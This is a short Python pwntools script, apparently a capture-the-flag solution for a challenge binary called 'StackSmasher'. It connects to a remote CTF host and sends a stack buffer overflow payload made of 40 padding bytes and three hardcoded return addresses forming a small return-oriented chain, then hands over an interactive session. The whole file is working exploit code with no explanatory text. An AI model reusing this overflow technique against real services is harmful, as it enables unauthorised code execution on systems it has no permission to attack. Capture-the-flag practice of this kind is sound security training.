from pwn import *
#p=process("./StackSmasher")
p=remote("ctf.mf.grsu.by", 9078)
payload=b'a'*40+p64(0x4011a4)+p64(0x4011b5)+p64(0x401166)
#input()
p.send(payload)
p.interactive()
